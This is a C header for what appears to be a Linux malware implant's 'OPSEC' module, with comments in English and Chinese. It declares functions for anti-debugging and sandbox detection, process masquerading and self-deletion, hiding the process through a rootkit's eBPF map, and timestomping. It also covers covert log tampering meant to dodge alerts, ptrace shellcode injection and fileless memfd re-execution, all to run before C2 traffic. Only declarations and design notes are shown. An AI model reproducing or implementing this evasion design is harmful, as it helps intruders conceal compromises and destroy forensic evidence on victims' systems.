#ifndef OPSEC_H
#define OPSEC_H

#include "types.h"

/// OPSEC checks -- anti-debug, VM detection, container detection, eBPF detection
/// Call opsec_check() at startup before any C2 communication.

/// Run all OPSEC checks. Returns 0 if safe, -1 if hostile environment detected.
int opsec_check(void);

/// Individual checks (can be called separately)
int opsec_anti_debug(void);       /* ptrace(TRACEME) + /proc/self/status TracerPid */
int opsec_vm_detect(void);        /* VM/hypervisor detection via CPUID / DMI */
int opsec_container_detect(void); /* cgroup v1/v2, /.dockerenv, namespace checks */
int opsec_ebpf_detect(void);      /* eBPF program enumeration (kprobes/tracepoints) */

/// Process masquerading — called at startup
/// Modifies /proc/self/comm and argv[0] to fake process name
void opsec_masquerade(const char *fake_name, char **argv);

/// P1 — 启动期 /proc/<pid> 自覆盖（方案 §3.4 / B2·B3·B4）
/// comm+argv[0] 伪装（随机内核线程名）、cwd 归位到 "/"、自删可执行文件（非 SO 构建）。
/// 在 opsec_check() 之后、任何网络活动之前调用。
int opsec_self_cover(char **argv);

/// P2 B10 — 自隐藏：把自身 pid 十进制串写进 rootkit 的 `hide_names`（门 S2：
/// `ls /proc` 看不见本进程）。自行发现并**自校验**目标 map（pin `*_map0`
/// + `BPF_OBJ_GET_INFO_BY_FD` 断言 type=HASH/key=64/value=1/name=hide_names），
/// 不匹配就不写。返回生效的 map 数；0 = 当时没有可用的 rootkit（不是错误）。
int opsec_hide_self(void);

/// B10 周期闸门：成功一次即永久静默；失败按 15s→300s 指数退避
/// （rootkit 可能后于 agent 加载）。接入 `ax_behavior_noise()` 的周期钩子。
void opsec_hide_self_tick(void);

/// Timestomping — modify file timestamps via utimensat syscall
/// ts_sec=0 means copy timestamps from reference_path
int opsec_timestomp(const char *path, long ts_sec);

/// Log evasion（P2-E 重做）—— 默认**不破坏任何文件的完整性**：
/// auditd 存活时不动 audit 日志；journald 走「SIGUSR2 轮转 + 删归档」；/var/log 文本与
/// 定长登录记录默认不动（要清理走 opsec_redact_file 做等长就地改写）。
/// 摘要写入 rep（可为 NULL）。返回处理项数。
int opsec_clean_logs(char *rep, int replen);

/// P2-E5：auditd 是否存活。判定只用只读手段（pid 文件 + /proc 扫描），
/// 不 execve auditctl —— 那本身就是一条审计事件。返回 1/0。
int opsec_auditd_alive(void);

/// P2-E3：journald 处理。返回删除的**归档**文件数（活跃 *.journal 绝不删）；
/// 0 = 非持久化 journal（日志在 /run/log/journal，reboot 即失）无需处理。
int opsec_journal_purge(void);

/// P2-E4：等长就地改写 —— 把 path 里的 needles[j] 覆写成 subs[j]，
/// **文件大小一个字节不变**（替换串不足右侧补 '0'、超长截断）。
/// 用于替代"整文件 truncate"（后者的大小突变为 0 本身就是强告警信号）。
/// 返回改写次数，-1 = 打不开。
int opsec_redact_file(const char *path, const char *const *needles,
                      const char *const *subs, int n);

/// Process injection via ptrace — inject + exec shellcode in target pid
int opsec_inject_ptrace(int target_pid, const uint8_t *shellcode, size_t sc_len);

/// Fileless self-re-exec via memfd_create
/// Reads own binary from /proc/self/exe, creates anonymous fd, fexecve
int opsec_migrate_memfd(char **argv, char **envp);

#endif /* OPSEC_H */
